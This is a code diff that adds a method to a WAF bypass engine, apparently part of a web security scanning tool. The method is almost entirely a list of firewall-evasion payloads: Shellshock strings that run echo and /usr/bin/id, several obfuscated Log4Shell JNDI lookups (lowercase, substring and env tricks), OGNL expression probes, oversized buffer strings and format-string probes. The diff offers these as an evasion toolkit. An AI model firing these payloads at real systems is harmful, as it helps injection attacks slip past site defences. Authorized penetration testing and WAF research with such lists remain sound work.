@@ -609,6 +609,37 @@ class WafBypassEngine:
 
         return bypasses[:20]
 
+    def generate_memcorrupt_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
+        """Generate WAF bypass payloads for memory corruption attacks."""
+        bypasses: list[dict[str, str]] = []
+
+        # Shellshock encoding variants
+        bypasses.append({"payload": "() { :;}; echo vulnerable", "technique": "shellshock", "confidence": "medium"})
+        bypasses.append({"payload": "%28%29%20%7B%20%3A%3B%7D%3B%20echo%20vulnerable", "technique": "shellshock_urlenc", "confidence": "medium"})
+        bypasses.append({"payload": "() { :;}; /usr/bin/id", "technique": "shellshock_fullpath", "confidence": "medium"})
+        bypasses.append({"payload": "() { :; }; echo Content-Type: text/plain; echo; echo vulnerable", "technique": "shellshock_cgi", "confidence": "medium"})
+
+        # Log4Shell obfuscation variants
+        bypasses.append({"payload": "${jndi:ldap://127.0.0.1/}", "technique": "log4shell_basic", "confidence": "medium"})
+        bypasses.append({"payload": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1/}", "technique": "log4shell_lowercase", "confidence": "high"})
+        bypasses.append({"payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/}", "technique": "log4shell_reverse_substr", "confidence": "high"})
+        bypasses.append({"payload": "${j${::-n}di:ldap://127.0.0.1/}", "technique": "log4shell_partial_obfusc", "confidence": "high"})
+        bypasses.append({"payload": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//127.0.0.1/}", "technique": "log4shell_env_bypass", "confidence": "high"})
+
+        # OGNL encoding variants
+        bypasses.append({"payload": "%25{1+1}", "technique": "ognl_urlenc", "confidence": "medium"})
+        bypasses.append({"payload": "${1+1}", "technique": "ognl_el_expr", "confidence": "medium"})
+
+        # Oversized header bypass (chunked delivery)
+        bypasses.append({"payload": "A" * 8192, "technique": "buffer_overflow_8k", "confidence": "low"})
+        bypasses.append({"payload": "A" * 65536, "technique": "buffer_overflow_64k", "confidence": "low"})
+
+        # Format string via encoding
+        bypasses.append({"payload": "%25x" * 20, "technique": "format_string_urlenc", "confidence": "medium"})
+        bypasses.append({"payload": "%25n", "technique": "format_string_write_urlenc", "confidence": "medium"})
+
+        return bypasses
+
     def get_profile(self, domain: str) -> WafProfile | None:
         """Get cached WAF profile for a domain."""
         return self._profiles.get(domain)
